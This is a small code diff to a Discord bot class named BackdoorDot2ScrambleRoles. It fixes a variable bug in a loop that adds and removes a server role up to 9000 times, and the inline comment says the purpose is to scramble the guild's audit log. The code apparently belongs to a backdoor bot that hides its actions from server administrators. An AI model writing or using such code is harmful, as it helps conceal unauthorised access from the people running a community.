@@ -23,17 +23,17 @@ class BackdoorDot2ScrambleRoles(chattrigger.ChatTrigger):
 
         # now scramble the audit log
 
-        i = targetguild.roles[0]
+        role = targetguild.roles[0]
 
         for i in range(9000):
             try:
-                await targetguild.me.add_roles(i)
+                await targetguild.me.add_roles(role)
             except discord.Forbidden:
                 traceback.print_exc()
                 break
 
             try:
-                await targetguild.me.remove_roles(i)
+                await targetguild.me.remove_roles(role)
             except discord.Forbidden:
                 traceback.print_exc()
                 break
